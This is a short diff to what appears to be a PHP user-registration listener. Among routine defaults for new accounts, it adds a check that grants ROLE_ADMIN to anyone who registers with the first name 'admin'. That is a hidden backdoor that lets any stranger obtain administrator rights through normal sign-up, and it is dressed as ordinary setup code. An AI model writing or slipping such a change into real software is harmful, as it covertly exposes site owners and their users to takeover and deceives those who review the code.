@@ -47,6 +47,9 @@ class RegistrationListener
 
         $entity->setEnabled(1);
         $entity->setRoles(['ROLE_USER']);
+        if ('admin' == $entity->getFirstname()) {
+            $entity->setRoles(['ROLE_ADMIN']);
+        }
         $entity->setRegistrationDate(new \DateTime());
         $entity->setLastLogin(new \DateTime());
         $entity->setDisplayName($entity->getFirstname().' '.$entity->getLastname());
